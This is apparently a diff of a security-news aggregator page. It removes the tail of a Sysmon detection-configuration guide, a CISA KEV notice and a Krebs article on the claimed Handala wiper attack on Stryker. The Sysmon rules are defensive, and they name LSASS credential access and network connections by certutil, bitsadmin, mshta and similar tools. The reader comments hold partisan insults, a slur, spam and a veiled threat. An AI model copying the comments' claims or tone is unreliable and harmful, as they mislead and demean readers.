-<Image condition="end with">\cmd. exe</Image>
-<Image condition="end with">\wscript.exe</Image>
-<Image condition="end with">\cscript.exe</Image>
-<Image condition="end with">\mshta.exe</Image>
-<Image condition="end with">\rundll32.exe</Image>
-<Image condition="end with">\regsvr32.exe</Image>
-<Image condition="end with">\certutil.exe</Image>
-<Image condition="end with">\bitsadmin.exe</Image>
-</NetworkConnect>
-</RuleGroup>
-<!--
-HTTPS Exclusions - COMPOUND RULES ONLY
-CRITICAL: Use multiple fields (Image + ParentImage with FULL PATHS) to prevent bypass via renaming
-Single-field exclusions are trivially bypassed by attackers
-Example compound exclusion structure (implement based on your environment):
-<NetworkConnect onmatch="exclude">
-<Rule groupRelation="and">
-<Image condition="is">C:\Program Files\Google\Chrome\Application\chrome.exe</Image>
-<ParentImage condition="is">C:\Program Files\Google\Chrome\Application\chrome.exe</ParentImage>
-<DestinationPort condition="is">443</DestinationPort>
-</Rule>
-<Rule groupRelation="and">
-<Image condition="is">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Image>
-<ParentImage condition="is">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</ParentImage>
-<DestinationPort condition="is">443</DestinationPort>
-</Rule>
-</NetworkConnect>
-Build your exclusion list by baselining legitimate HTTPS traffic in your environment.
-Always use full paths. Never exclude based on process name alone.
--->
-<!-- Event 6: Driver Load - Log all, watch for unsigned -->
-<RuleGroup name="DriverLoad" groupRelation="or">
-<DriverLoad onmatch="include">
-<Signed condition="is">false</Signed>
-</DriverLoad>
-</RuleGroup>
-<!-- Event 7: Image Load (DLL) - Very noisy, focus on specific scenarios -->
-<RuleGroup name="ImageLoad" groupRelation="or">
-<ImageLoad onmatch="include">
-<!-- DLLs loaded from unusual paths -->
-<ImageLoaded condition="contains">\Users\</ImageLoaded>
-<ImageLoaded condition="contains">\Temp\</ImageLoaded>
-<ImageLoaded condition="contains">\AppData\</ImageLoaded>
-<ImageLoaded condition="contains">\Downloads\</ImageLoaded>
-<!-- Unsigned DLLs (adjust based on noise) -->
-<Signed condition="is">false</Signed>
-</ImageLoad>
-<ImageLoad onmatch="exclude">
-<Image condition="is">C:\Windows\System32\svchost.exe</Image>
-<Image condition="is">C:\Windows\explorer.exe</Image>
-</ImageLoad>
-</RuleGroup>
-<!-- Event 10: Process Access - Focus on LSASS -->
-<RuleGroup name="ProcessAccess" groupRelation="or">
-<ProcessAccess onmatch="include">
-<TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
-</ProcessAccess>
-<ProcessAccess onmatch="exclude">
-<!-- Known legitimate LSASS accessors - tune for your environment -->
-<SourceImage condition="is">C:\Windows\System32\wbem\WmiPrvSE.exe</SourceImage>
-<SourceImage condition="is">C:\Windows\System32\svchost.exe</SourceImage>
-<SourceImage condition="is">C:\Windows\System32\lsass.exe</SourceImage>
-<SourceImage condition="contains">\Microsoft\Windows Defender\</SourceImage>
-</ProcessAccess>
-</RuleGroup>
-<!-- Event 11: File Create - Focus on executable and script types -->
-<!-- Event 11: File Create - Focus on executable types and critical OS locations -->
-<RuleGroup name="FileCreate" groupRelation="or">
-<FileCreate onmatch="include">
-<!-- All Windows executable file types -->
-<TargetFilename condition="end with">.exe</TargetFilename>
-<TargetFilename condition="end with">.dll</TargetFilename>
-<TargetFilename condition="end with">.sys</TargetFilename>
-<TargetFilename condition="end with">.drv</TargetFilename>
-<TargetFilename condition="end with">.ocx</TargetFilename>
-<TargetFilename condition="end with">.cpl</TargetFilename>
-<TargetFilename condition="end with">.scr</TargetFilename>
-<TargetFilename condition="end with">.com</TargetFilename>
-<TargetFilename condition="end with">.pif</TargetFilename>
-<!-- Script file types -->
-<TargetFilename condition="end with">.ps1</TargetFilename>
-<TargetFilename condition="end with">.psm1</TargetFilename>
-<TargetFilename condition="end with">.psd1</TargetFilename>
-<TargetFilename condition="end with">.bat</TargetFilename>
-<TargetFilename condition="end with">.cmd</TargetFilename>
-<TargetFilename condition="end with">.vbs</TargetFilename>
-<TargetFilename condition="end with">.vbe</TargetFilename>
-<TargetFilename condition="end with">.js</TargetFilename>
-<TargetFilename condition="end with">.jse</TargetFilename>
-<TargetFilename condition="end with">.wsf</TargetFilename>
-<TargetFilename condition="end with">.wsh</TargetFilename>
-<TargetFilename condition="end with">.hta</TargetFilename>
-<!-- Other potentially malicious file types -->
-<TargetFilename condition="end with">.msi</TargetFilename>
-<TargetFilename condition="end with">.msp</TargetFilename>
-<TargetFilename condition="end with">.lnk</TargetFilename>
-<TargetFilename condition="end with">.url</TargetFilename>
-<TargetFilename condition="end with">.inf</TargetFilename>
-<TargetFilename condition="end with">.reg</TargetFilename>
-<!-- Critical OS directories - Windows System directories -->
-<TargetFilename condition="begin with">C:\Windows\System32\</TargetFilename>
-<TargetFilename condition="begin with">C:\Windows\SysWOW64\</TargetFilename>
-<TargetFilename condition="begin with">C:\Windows\</TargetFilename>
-<!-- Boot and startup locations -->
-<TargetFilename condition="contains">\Windows\System32\drivers\</TargetFilename>
-<TargetFilename condition="contains">\Windows\System32\config\</TargetFilename>
-<!-- User profile critical locations -->
-<TargetFilename condition="contains">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</TargetFilename>
-<TargetFilename condition="contains">\AppData\Local\Temp\</TargetFilename>
-<!-- Public and shared locations -->
-<TargetFilename condition="contains">\Users\Public\</TargetFilename>
-<TargetFilename condition="contains">\ProgramData\</TargetFilename>
-<!-- Temp directories -->
-<TargetFilename condition="contains">\Temp\</TargetFilename>
-<TargetFilename condition="contains">\Windows\Temp\</TargetFilename>
-<!-- Common download and staging locations -->
-<TargetFilename condition="contains">\Downloads\</TargetFilename>
-<TargetFilename condition="contains">\Desktop\</TargetFilename>
-<!-- Recycle bin (sometimes used for staging) -->
-<TargetFilename condition="contains">\$Recycle.Bin\</TargetFilename>
-</FileCreate>
-</RuleGroup>
-<!-- Events 12, 13, 14: Registry - Focus on persistence locations -->
-<RuleGroup name="RegistryEvent" groupRelation="or">
-<RegistryEvent onmatch="include">
-<!-- Run keys -->
-<TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
-<!-- Services -->
-<TargetObject condition="contains">\Services\</TargetObject>
-<!-- COM hijacking -->
-<TargetObject condition="contains">\Classes\CLSID\</TargetObject>
-<!-- Image File Execution Options -->
-<TargetObject condition="contains">\Image File Execution Options\</TargetObject>
-<!-- AppInit DLLs -->
-<TargetObject condition="contains">\Windows\AppInit_DLLs</TargetObject>
-<!-- Winlogon -->
-<TargetObject condition="contains">\Winlogon\</TargetObject>
-<!-- Security packages -->
-<TargetObject condition="contains">\Lsa\</TargetObject>
-</RegistryEvent>
-</RuleGroup>
-<!-- Events 17, 18: Named Pipes - Exclusion-based approach -->
-<!-- Build a baseline of valid pipes in YOUR environment and exclude those -->
-<!-- Alert on everything else at the SIEM layer -->
-<RuleGroup name="PipeEvent" groupRelation="or">
-<PipeEvent onmatch="exclude">
-<!--
-IMPORTANT: Baseline your environment's legitimate pipes and add them here.
-The goal is to log unusual/new pipes and alert at the SIEM.
-These are common Windows pipes - adjust for your environment.
-See: https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/named-pipes.md
--->
-<PipeName condition="is">\lsass</PipeName>
-<PipeName condition="is">\ntsvcs</PipeName>
-<PipeName condition="is">\scerpc</PipeName>
-<PipeName condition="is">\wkssvc</PipeName>
-<PipeName condition="is">\srvsvc</PipeName>
-<PipeName condition="is">\winreg</PipeName>
-<PipeName condition="is">\spoolss</PipeName>
-<PipeName condition="is">\netlogon</PipeName>
-<PipeName condition="is">\samr</PipeName>
-<PipeName condition="is">\browser</PipeName>
-<!-- Add your environment-specific legitimate pipes below -->
-<!-- Example: Your EDR, management tools, LOB applications -->
-</PipeEvent>
-</RuleGroup>
-<!-- Events 19, 20, 21: WMI - Log all -->
-<RuleGroup name="WmiEvent" groupRelation="or">
-<WmiEvent onmatch="include">
-<Operation condition="is">Created</Operation>
-</WmiEvent>
-</RuleGroup>
-<!-- Event 22: DNS Query - Focus on interesting processes -->
-<RuleGroup name="DnsQuery" groupRelation="or">
-<DnsQuery onmatch="include">
-<Image condition="contains">powershell</Image>
-<Image condition="contains">cmd. exe</Image>
-<Image condition="contains">wscript</Image>
-<Image condition="contains">cscript</Image>
-<Image condition="contains">rundll32</Image>
-<Image condition="contains">regsvr32</Image>
-</DnsQuery>
-<DnsQuery onmatch="exclude">
-<QueryName condition="end with">.microsoft.com</QueryName>
-<QueryName condition="end with">.windows.com</QueryName>
-<QueryName condition="end with">.windowsupdate.com</QueryName>
-</DnsQuery>
-</RuleGroup>
-</EventFiltering>
-</Sysmon>
-Deploying Sysmon
-Installation
-Download Sysmon from the official [Sysinternals page](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).
-Install with configuration:
-I recommend you copy the configuration shown above into an XML document and apply it.
-sysmon64.exe -accepteula -i sysmon-config.xml
-Update existing configuration:
-After tunning the configuration to your liking, you can apply the tuned config to a system using scripts, GPO, or Intune. The command below will apply the updated config.
-sysmon64.exe -c sysmon-config.xml
-Check current configuration:
-sysmon64.exe -c
-Log Location
-Sysmon events appear in:
-Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
-Log Size Configuration
-Default log size is typically too small. Increase it:
-wevtutil sl "Microsoft-Windows-Sysmon/Operational" /ms:524288000
-Or via GPO:
-Computer Configuration
-→ Administrative Templates
-→ Windows Components
-→ Event Log Service
-→ Sysmon
-→ Specify maximum log file size: 512000 KB
-Configuration Tuning Philosophy
-The configuration I provided is a starting point. I took the effort to ensure that the config would serve as a starting point for workstation and server alike. As you tune the config, ensure that you tune one for workstation and one for server. Once this is done, depending on the roles for servers and who uses the workstations, you can tune even further. Start slow and test. You need to tune it for your environment. Here's my approach:
-- Start noisy, filter down: Enable more than you need initially. See what generates volume. Add exclusions for verified benign activity.
-- Threat model drives filtering: What attacks are you most concerned about? Adjust your filters accordingly. If you're worried about insider threats, you might want more coverage. If you're focused on commodity malware, you can be more aggressive with exclusions.
-- Baseline before excluding: This is especially important for named pipes but applies broadly. Understand what's normal in your environment before you start filtering. Otherwise, you risk excluding something an attacker is abusing.
-- Test before deploying: Deploy to a test group first. Measure log volume and system impact. Adjust before rolling out widely.
-- Iterate continuously: Your environment changes. So do attacker techniques. Review and update your configuration quarterly, at minimum.
-- Use community resources: The
-[TrustedSec Sysmon Community Guide](https://github.com/trustedsec/SysmonCommunityGuide)goes deep on each event type with practical configuration guidance. We cover strategies for named pipes, network connections, registry monitoring, and more. It's worth reading through before finalizing your configuration.
-If you prefer video content, we also have a [Sysmon YouTube series](https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7) that walks through configuration concepts and practical deployment scenarios.
-Sysmon Alternatives and Companions
-I want to be transparent—Sysmon isn't the only option. Some alternatives:
-- Velociraptor – Open-source DFIR tool with endpoint visibility
-- osquery – SQL-based endpoint telemetry
-- EDR-native capabilities – Many EDRs provide similar telemetry (but that's our single-source problem)
-The advantage of Sysmon is that it's free, it's from Microsoft (so no third-party driver concerns), and the logs go to the standard Windows Event Log infrastructure.
-What We've Built So Far
-Across Parts 1-4 of this blog series, we've established:
-[Part 2 - Windows Security Events:](https://trustedsec.com/blog/building-a-detection-foundation-part-2-windows-security-events)
-- Logon/Logoff for session tracking
-- Process Creation (4688) with command lines
-- Service installation
-- Scheduled tasks
-- Script Block Logging (4104) for deobfuscated scripts
-- Module Logging (4103) for command execution
-- Transcription for full session recording
-Part 4 - Sysmon:
-- Enhanced process creation with hashes
-- Network connections by process
-- Registry modifications
-- File creation
-- Driver and DLL loading
-- Named pipe activity
-- WMI events
-- DNS queries
-In Part 5, we'll bring it all together—correlating across these sources during investigations and building detections that leverage the full foundation.
-Resources for Going Deeper
-[TrustedSec Sysmon Community Guide](https://github.com/trustedsec/SysmonCommunityGuide)– Comprehensive documentation on each Sysmon event type with configuration strategies and examples[Sysmon Video Series](https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7)– Video walkthroughs covering deployment, configuration, and practical use cases[Microsoft Sysmon Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)– Official documentation and download</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">CISA Adds Five Known Exploited Vulnerabilities to Catalog</h2>
             <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/03/20/cisa-adds-five-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
             <div class="content-text">CISA Adds Five Known Exploited Vulnerabilities to Catalog
@@ -985,126 +823,6 @@ These types of vulnerabilities are frequent attack vectors for malicious cyber a
 [Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities](/binding-operational-directive-22-01) established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the [BOD 22-01 Fact Sheet](/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf) for more information.
 Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of [KEV Catalog vulnerabilities](/known-exploited-vulnerabilities-catalog) as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the [specified criteria](/known-exploited-vulnerabilities).
 This product is provided subject to this [Notification](/notification) and this [Privacy & Use](/privacy-policy) policy.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-8" class="article-body">
-            <h2 class="article-title">Iran-Backed Hackers Claim Wiper Attack on Medtech Firm Stryker</h2>
-            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/03/iran-backed-hackers-claim-wiper-attack-on-medtech-firm-stryker/" target="_blank">Original Link</a></p>
-            <div class="content-text">A hacktivist group with links to Iran’s intelligence agencies is claiming responsibility for a data-wiping attack against Stryker, a global medical technology company based in Michigan. News reports out of Ireland, Stryker’s largest hub outside of the United States, said the company sent home more than 5,000 workers there today. Meanwhile, a voicemail message at Stryker’s main U.S. headquarters says the company is currently experiencing a building emergency.
-Based in Kalamazoo, Michigan, Stryker [NYSE:SYK] is a medical and surgical equipment maker that reported $25 billion in global sales last year. In a lengthy statement posted to Telegram, a hacktivist group known as Handala (a.k.a. Handala Hack Team) claimed that Stryker’s offices in 79 countries have been forced to shut down after the group erased data from more than 200,000 systems, servers and mobile devices.
-“All the acquired data is now in the hands of the free people of the world, ready to be used for the true advancement of humanity and the exposure of injustice and corruption,” a portion of the Handala statement reads.
-The group said the wiper attack was in retaliation for a Feb. 28 missile strike that hit an Iranian school and killed at least 175 people, most of them children. The New York Times [reports](https://www.nytimes.com/2026/03/11/us/politics/iran-school-missile-strike.html) today that an ongoing military investigation has determined the United States is responsible for the deadly Tomahawk missile strike.
-Handala was one of several hacker groups recently [profiled](https://unit42.paloaltonetworks.com/iranian-cyberattacks-2026/) by Palo Alto Networks, which links it to Iran’s Ministry of Intelligence and Security (MOIS). Palo Alto says Handala surfaced in late 2023 and is assessed as one of several online personas maintained by [Void Manticore](https://malpedia.caad.fkie.fraunhofer.de/actor/void_manticore), a MOIS-affiliated actor.
-Stryker’s website says the company has 56,000 employees in 61 countries. A phone call placed Wednesday morning to the media line at Stryker’s Michigan headquarters sent this author to a voicemail message that stated, “We are currently experiencing a building emergency. Please try your call again later.”
-A [report](https://www.irishexaminer.com/news/munster/arid-41808308.html) Wednesday morning from the Irish Examiner said Stryker staff are now communicating via WhatsApp for any updates on when they can return to work. The story quoted an unnamed employee saying anything connected to the network is down, and that “anyone with Microsoft Outlook on their personal phones had their devices wiped.”
-“Multiple sources have said that systems in the Cork headquarters have been ‘shut down’ and that Stryker devices held by employees have been wiped out,” the Examiner reported. “The login pages coming up on these devices have been defaced with the Handala logo.”
-Wiper attacks usually involve malicious software designed to overwrite any existing data on infected devices. But a trusted source with knowledge of the attack who spoke on condition of anonymity told KrebsOnSecurity the perpetrators in this case appear to have used a Microsoft service called Microsoft Intune to issue a ‘remote wipe’ command against all connected devices.
-Intune is a cloud-based solution built for IT teams to enforce security and data compliance policies, and it provides a single, web-based administrative console to monitor and control devices regardless of location. The Intune connection is supported by [this Reddit discussion](https://www.reddit.com/r/cybersecurity/comments/1rqopq0/stryker_hit_by_handala_intune_managed_devices/) on the Stryker outage, where several users who claimed to be Stryker employees said they were told to uninstall Intune urgently.
-Palo Alto says Handala’s hack-and-leak activity is primarily focused on Israel, with occasional targeting outside that scope when it serves a specific agenda. The security firm said Handala also has taken credit for recent attacks against fuel systems in Jordan and an Israeli energy exploration company.
-“Recent observed activities are opportunistic and ‘quick and dirty,’ with a noticeable focus on supply-chain footholds (e.g., IT/service providers) to reach downstream victims, followed by ‘proof’ posts to amplify credibility and intimidate targets,” Palo Alto researchers wrote.
-The Handala manifesto posted to Telegram referred to Stryker as a “Zionist-rooted corporation,” which may be a reference to the company’s 2019 acquisition of the Israeli company OrthoSpace.
-Stryker is a major supplier of medical devices, and the ongoing attack is already affecting healthcare providers. One healthcare professional at a major university medical system in the United States told KrebsOnSecurity they are currently unable to order surgical supplies that they normally source through Stryker.
-“This is a real-world supply chain attack,” the expert said, who asked to remain anonymous because they were not authorized to speak to the press. “Pretty much every hospital in the U.S. that performs surgeries uses their supplies.”
-John Riggi, national advisor for the American Hospital Association (AHA), said the AHA is not aware of any supply-chain disruptions as of yet.
-“We are aware of reports of the cyber attack against Stryker and are actively exchanging information with the hospital field and the federal government to understand the nature of the threat and assess any impact to hospital operations,” Riggi said in an email. “As of this time, we are not aware of any direct impacts or disruptions to U.S. hospitals as a result of this attack. That may change as hospitals evaluate services, technology and supply chain related to Stryker and if the duration of the attack extends.”
-According to a March 11 memo from the state of Maryland’s Institute for Emergency Medical Services Systems, Stryker indicated that some of their computer systems have been impacted by a “global network disruption.” The memo indicates that in response to the attack, a number of hospitals have opted to disconnect from Stryker’s various online services, including LifeNet, which allows paramedics to transmit EKGs to emergency physicians so that heart attack patients can expedite their treatment when they arrive at the hospital.
-“As a precaution, some hospitals have temporarily suspended their connection to Stryker systems, including LIFENET, while others have maintained the connection,” wrote Timothy Chizmar, the state’s EMS medical director. “The Maryland Medical Protocols for EMS requires ECG transmission for patients with acute coronary syndrome (or STEMI). However, if you are unable to transmit a 12 Lead ECG to a receiving hospital, you should initiate radio consultation and describe the findings on the ECG.”
-This is a developing story. Updates will be noted with a timestamp.
-Update, 2:54 p.m. ET: Added comment from Riggi and perspectives on this attack’s potential to turn into a supply-chain problem for the healthcare system.
-Update, Mar. 12, 7:59 a.m. ET: Added information about the outage affecting Stryker’s online services.
-If medical device companies are “fair game”, are drug manufacturers and hospitals next?
-No honor among thieves??
-Israel quite literally flattened most hospitals in Gaza strip. You think they won’t do the same in Iran?
-What a ridiculous claim. Hamas was using hospitals as command centers,
-Israel did not attack the Minab school Just more excuses for terrorism and extortion.
-Bellingcat confirms it was a US Tomahawk, something that Israel does not possess.
-Yes, I frequently store my ammo next to an MRI machine.
-Oh look.A brainwashed zio.Israle BOMBED HOSPITALS SCHOOL MOSQES AND AID SITES.Please have several thousand seats
-Well, people voted for Hamas in the last elections held and they knew what they’re buying. So sit down son and enjoy the FO part of FAFO.
-BIbi gave money to Hamas and undermined the PA. Read better child.
-That doesn’t make bombing schools, hospitals etc any less of a war crime.
-There is no justification for Israeli genocidal tactics and disregard of laws.
-Pointing this out is not supporting Hamas either.
-seeing truth is not the same as being brainwashed
-there are no good bombs and bad bombs
-dehumanization of people is typical brainwash agenda
-why kids in Ukraine or Gaza are worse than other kids
-they are if your set of rules are from hell
-Couldn’t agree more.
-thinking that what Israel really bombed is hospitals is funny, if you look at the facts you will understand these are weapon storage and terroists command centers. you are a result of a brain washed “enlightened and pure” society. keep ignoring the truth and believe the false propaganda of the left.
-The US killed 175 mostly children. Was that fair game?
-LOL put all your security on the cloud….
-“Microsoft service called Microsoft Intune to issue a ‘remote wipe’ command against all connected devices.”
-Every vendor that has moved to a cloud based console has been compromised
-Personally we quit using every security vendor that has moved to a cloud based console,
-If I can access it on the web, so can someone else
-I will stick will old school VPN and inside network please……
-people with VPN on their devices were wiped, and you have it wrong.
-Being connected to a cloud does not make you vulnerable, being connected to any network (even “inside”) does… good luck out there
-They’re talking about using SaaS cloud consoles that directly control their entire device fleet, as opposed to only site-accessible compartmentalized consoles behind a specific private self-run VPN. That is actually not wrong, that’s absolutely the smarter play if less convenient and potentially overlook-able unless IT stays on toes. Calling a person a clown off the bat online because you haven’t even considered fully what they’re saying is pretty juvenile IMO, but we all have to grow up sometime I guess.
-It’s never as simple as **cloud bad!** I’ve been in situations where similar wipe threats happened entirely “inside network”. The root-cause analysis usually points to at least two larger procedural issues:
-* Errors that are not caught, causing operations to continue when they should have been stopped
-* Operations that happen at scale without human oversight/approval
-This company of 50k+ employees (or, maybe worse, the garbage Microsoft software they used and is used by *many* other organizations) had a way to blow away their entire IT infrastructure? That’s bonkers! Something right out of SpaceBalls: “Thank you for pressing the self destruct button.”
-Thank you Ronald. I’ve been concerned about this from the start of “cloud” services. The company I was at got on that train. I think everyone for the most part has. It is just too much exposure.
-I sent one of their recruiters a resume and an offer to help on LI 😉
-I see all those funding cuts for national cybersecurity are working out…
-The US brought back 4 avenger-class minesweepers from the mideast, they arrived in Philadelphia the same day Iran started mining the strait. If this isn’t the smartest and most deeply thought-out administration in American history, it’s certainly the one with the most brightly colored hats.
-Yeah, because those ships are THIRTY YEARS OLD and we already have replacements that are ALREADY ACTIVE in the straight of hormuz called Littoral Combat Ships. For all the budget discussion around them, their entire mission set was designed around defense in littoral waters, such as the Strait of Hormuz. Your comment simply does not make sense to anyone actively monitoring the situation.
-Not going to age well that comment….crude carriers sail in the deep waters…which is what this is all about!
-Remember it’s not the physical space which needs to be cleared of mines…it’s the mindset of the insurance market…welcome to asymmetrical warfare 🙂
-Littoral ships have no problems operating in deep water. They are not designed to engage true deep water navy ships in combat is all, ie they can’t hold deep water by themselves against a real navy. For that there is the rest of the US navy and navy airforce, and they have already sunk most of the Iranian navy.
-The main danger isn’t mines, ie to set a proper minefield that would requires a proper minesweep to clear, requires a minelaying ship to sail uncontested through the area. For what can be placed now, the remote mine removing submersible that the littoral ships can bring is sufficient.
-The current danger from Iran is not navy ships, its fast attack boats, and sea drones which have similar performance to fast attack boats. The avengers have .50cal machine guns which are only intended for defensive purposes. Equivalent soviet 12.7mm guns in the russian black sea fleet has proven very unreliable at defeating Ukrainian sea drones. At best all they have done is occasionally protect the vessel they are floating on, and can do nothing about drones targeting other vessels.
-What the littoral ships have is a 57mm automatic bofors, in an unmanned, fully stabilized, computer controlled radar guided mount. Which is probably the best solution to asymmetric drone and boat style naval warfare currently available.
-Littoral combat ships have been marred by serious engine defects, shortened replenishment schedules and have no history of achieving anything significant in any theater yet. They’re expensive comparatively for what they are and have no track record of volume success in de-mining anything at all, anywhere. They may be theoretically capable to do that but it’s certainly not going to be as effective as a purpose-built minesweeper FLEET of smaller vessels in coordination that already existed there. Mines can be laid in an afternoon to meet your description of ‘proper’ minefield that would take _months_ to remove. LCS have never been tested against significant drone attacks, and as capable (theoretically) as Bofors guns might be against such threats attacking the ship _itself_ they’re next to useless for theater protection. Certainly a sufficiently sized swarm of inexpensive drones would be expected to achieve hits against a much, much more expensive ad hoc minesweeper role. It’s a jack of trades and an expensive one that’s never been tested, lest of all significantly damaged or having achieved a significant objective requiring ASAP minesweeping. Having so few of them as we do increases the chance that one being damaged or disabled would severely compromise the minesweeping role in theater. The longer the strait remains closed, the more incompetent the administration looks as the western economies all share the burdens. LCS isn’t going to dent that outcome if Iran successfully mines it.
-The T-64 began its design process circa late 1950s, T-64A entered service circa 1967 and its first combat engagement was 1992. ie if you don’t fight a war, your gear doesn’t get “proven”. This is the opportunity that will allow littoral ships to prove useful or not.
-At this point in time, actual estimates of mines laid vary between 10 and 0, and estimates of sunken known minelaying ships to be something like 14. The resources required to enforce a fully closed strait doesn’t exist, its just a passage that is currently too risky for commercial insurance.
-The US has more than one integrated MCM platform, including helicopter and remote submersible based systems, none of which hard require either littorals or avengers to be present. The main threat is not mines, its speed boat based drones and actual projectiles including actual antiship missiles. All an avenger can do against those threats is float there and take hits, casualties and sink.
-I would not expect that swarming sea drones is an easy task, nor are they particularly cheap and I would also expect that such a swarm would be visible being prepared on the coast, which would invite all sorts of counters, not limited to aircraft or missiles/shellfire from the navy.
-Launching individual sea drones stealthily is much more feasible, which is why the attack pattern looks like it does, most at the bend, but some all up and down the iranian coast.
-It’s the worst test case scenario for finding out if your kit is up to task or not.
-yahoo.com/news/articles/u-navy-minesweepers-assigned-middle-210524347.html
-They still float, weren’t rusting to death, and were capable minesweeping craft in-theater as opposed to whatever they’re hastily bringing in RN to replace them, after the fact, because Trump apparently didn’t consider the ramifications of the Strait of Hormuz before he set it on fire at Bibi’s beckon.
-Littoral combat ships have never been proven minesweepers at volume in an active theater scenario. Avenger class vessels are exactly that, and already there. Making the point about the mindless timing of their withdrawal from theater RIGHT AS THEY BECOME CRUCIAL ASSETS because of a decision to go to war (of choice) should be obvious to most, but I’ll cede that you sure don’t seem to get it.
-Littoral ships are also riddled with shakedown issues and are vastly more expensive than projected, so your particular points of choice to try to explain away this tactical blunder in a war (of choice) rife with strategic blunders as far as the eye can see are pretty evenly self-blunted. Bravo sir, you could be Trump’s next Secretary of Doing War Badly, you’ve got the posturing down pat.
-The littoral ships have been around for quite a while now, in the class that had the gearbox issue, that has been fixed, and the early hulls which would have been difficult to bring up to standard are in reserve. As I said in my other post, there isn’t a volume demining problem at this point in time. The fact that too much was spent on procurement is a general US procurement issue, its not an active service issue.
-IMO no military can ever guess what its dimwit political leadership will do and at some point the equipment has to be modernized and changeovers have to occur.
-They’ve been having their engines fail with seawater in oil for a while now, among other failures you’re trying to rose-color over. The math remains unchanged.
-They pulled minesweepers out of the theater right as they might have become crucially integral to the “plan” that has nothing to do with strategic thought.
-What would Iran have to gain from mining the Strait? As it stands, they already have the capability to attack any ships passing through the Strait as seen with the Thai ships this past week.
-Additionally, their biggest trade partner, China, uses the Strait, so WHY would they mine it and risk their biggest leverage in this conflict? The backing of China, and control of this Strait is the biggest leverage Iran has.
-Also, this administration is run by a bunch of p*dophiles protecting other p*dophiles, it will go down as the most shameful in modern American history.
-They would have the ability to close the strait without effort to any traffic besides their own. The fear of mines is almost as great a threat to shipping as un-passable mines themselves. The ships that are passing through are all Iranian-permitted – Think about that for a quick second before you reply.
-They know where they mine, they know where mines are, and others do not. That’s what you’re apparently misunderstanding about the threat. Also China apparently hedged oil bets ahead of this conflict and is in no big hurry to force reopening, they aren’t hurting particularly. They are the least affected and any Iranian effort to disrupt the western-backed economies benefits their interests. Mines can be later removed by the country that places them at any time at all. Removal by others takes a serious effort. It’s something that’s been known for decades already by everyone except apparently Donald Trump, mastermind military strategic genius that he claims to be.
-Ah! Now I understand what all those weird requests from IR domains were. And to think, we are just getting started. It’s going to be a fun March, with the Ides coming up and Microsoft in some areas an already open book…
-Thanks for the post and my group also thanks you, one team one goal.
-PleaseJustFixIT.org #HealthSupport #OneTeam
-Karma is a b. Stryker has been getting business unethically for years. Made my day.
-Love this comment !!! So true.
-How have they been doing business unethically? I’m not disagreeing. I genuinely do not know
-Ah, what was Stryker’s MS Secure Score? Everyone with an MS 365 tenant should be concerned and hoping they didn’t miss the same control that Stryker did.
-It’s unlikely Stryker will release their own Secure Score to the public, but it seems like the Stryker breach occurred due to privilege escalation due to a lack of governance controls. MS 365 users should probably be fine as long as they’re keeping an eye on their device management.
-Its likely that Stryker’s breach was likely due to their own fault since the breach occurred probably to a phishing attack or something that obtained an admins credentials. Microsoft 365 was not the vulnerability issue.
-Let’s not forget this story wouldn’t have been written if the orange one hadn’t started a war with Iran. But wait, wasn’t he supposed to be ‘The President of peace’, ‘I will focus on America’, ‘If I’m not elected, Kamala will start wars all over the world’. He’s showing his enjoyment of watching people die and inflicting suffering. And how can ANYONE believe this will end well considering he bankrupted 3 casinos. This is just the beginning of the pain the world will experience because of the actions of someone mentally ill who should be in a nursing home and not POTUS.
-I like turtles
-I also like turtles.
-George died in 2009. Clearly the person this is about has been soulless since 2002/2003.
-I think that turtles are fortunate to have a hard shell to protect them. Their domes are way better and cooler than any of our protective domes.
-Pity that we have to work to protect their breeding sites.
-Finding it harder and harder to not want to decimate and dismantle Israel’s ‘cybersecurity’ “program” my own self.
-“A source familiar with the attack told BleepingComputer that the threat actor used the wipe command in Intune, Microsoft’s cloud-based endpoint management service, to erase data from nearly 80,000 devices between 5:00 and 8:00 a.m. UTC on March 11”
-https://www.bleepingcomputer.com/news/security/stryker-attack-wiped-tens-of-thousands-of-devices-no-malware-needed/
-This article about bot control issues is a sobering reminder why automated systems need proper safeguards – especially in funded accounts where you’re operating under strict drawdown rules. I learned the hard way that one poorly-configured EA can blow a challenge, so I switched to Ratio X Toolbox which gives you multiple bots for different market regimes instead of relying on a single system that can malfunction. The stress testing features actually helped me understand my max daily loss limits before hitting real money. Have you found that diversifying across different EA types helps you survive the drawdown phases of prop firm challenges?
-Hey, howza boutta plug for some crap product and some totally non-profound ‘coded’ language. We need more tension, poorly done feints, and discussions of clipper ships. Otherwise, we are not fully populating the cyber-landscape with fully-featured, complex threat actors.
-my sec+ training says this is nation/state sponsored. not hacktivist.
-This attack shows the security vulnerability and the sophistication of Iran hacking attack.
-It only works when I’m Nepal.
